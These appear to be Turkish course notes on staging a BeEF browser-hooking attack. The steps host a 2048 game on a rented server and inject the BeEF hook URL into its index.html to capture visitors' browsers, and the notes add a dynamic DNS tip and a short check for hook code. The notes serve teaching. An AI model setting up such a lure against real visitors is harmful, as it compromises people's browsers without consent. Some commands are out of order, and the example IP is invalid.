# Dış Ağda Beef Saldırısı

- DigitalOcean üyelik alınır. Mail adresine satın alınan sunucun ip adresi ve şifresi yollanır.

* Digital Ocean Ücretsiz Kredi Kayıt Linki: https://m.do.co/c/5ecb7c546723

* GitHub Oyun Linki: https://github.com/atilsamancioglu/2048

> ssh root@134.209.305.177 // kullanıcıadı@sunucuip
> root@ubuntu > cd var //var klasörüne konumlanıldı
> root@ubuntu > apt-get install apache2 // apache kurulur
> root@ubuntu > cd html // html konumlanır
> root@ubuntu > service apache2 start // sunucu nete açılır
> root@ubuntu > git clone https://github.com/atilsamancioglu/2048 //
> root@ubuntu > apt-get install git // git yüklenir
> root@ubuntu > cd 2048
> root@ubuntu > ls // bu klasördeki tüm dosyaları /var/www/html  
> root@ubuntu > mv js /var/www/html //kes-dosyaadı-nereye gönder.Bütün dosyları tek tek gönderilir

- ip adresine gittiğimizde oyun açılır
- sunucuya Beef kurulur
- Beef dosyalarında > nano config.yaml dosyasında kullanıcı adı şifre değiştirilir
  > ./beef //beef çalıştırılır
- Terminalde çıkan hook url kopyalanır
  > nano index.html //hook kodu eklenir
- kullanıcı siteye girdiğinde online tarayıcılarda çıkar

## No Ip

- 123.45.67.89
  omer.ddns.net
  Yani IP yerine isim kullanırsın.

## Kendimizi Nasıl Koruruz

- Sağ tik ve sayfa kaynağı incele. Hook kodu var mı bakılabilir
